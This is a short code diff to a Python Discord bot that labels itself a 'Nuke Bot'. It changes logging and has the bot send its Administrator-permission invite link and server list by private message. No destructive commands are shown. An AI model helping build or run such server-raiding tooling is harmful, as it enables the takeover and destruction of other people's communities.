@@ -67,7 +67,7 @@ continue_sending = False
 async def on_ready():
     user = await bot.fetch_user(YOUR_DISCORD_USER_ID)
     print(Fore.GREEN + f'Successfully logged in as {bot.user}')
-    print(Fore.GREEN + f'Receiving Commands from {user.name}#{user.discriminator}')
+    print(Fore.GREEN + f'Receiving Commands from {user.name}#{user.discriminator}{RESET}')
     await user.send("Nuke Bot Ready for Action")
 
 @bot.command()
@@ -161,7 +161,8 @@ async def invite(ctx):
     client_id = bot.user.id  # Get the bot's client ID
     permissions = 8  # Administrator permissions
     invite_link = f"https://discord.com/oauth2/authorize?client_id={client_id}&permissions={permissions}&scope=bot"
-    await ctx.send(f"Bot Invite: {invite_link}")
+    await ctx.author.send(f"Bot Invite: {invite_link}")
+    print(f"Sent Invite Link.")
 @bot.command()
 async def list(ctx):
     if ctx.author.id != YOUR_DISCORD_USER_ID:
@@ -180,9 +181,10 @@ async def list(ctx):
             )
 
         if bot.guilds:
-            await ctx.send(embed=embed)
+            await ctx.author.send(embed=embed)
+            print("Sent List.")
         else:
-            await ctx.send("I'm not in any servers.")
+            await ctx.author.send("I'm not in any servers.")
     else:
         await ctx.send("This command can only be used in DMs.")
 @bot.command()
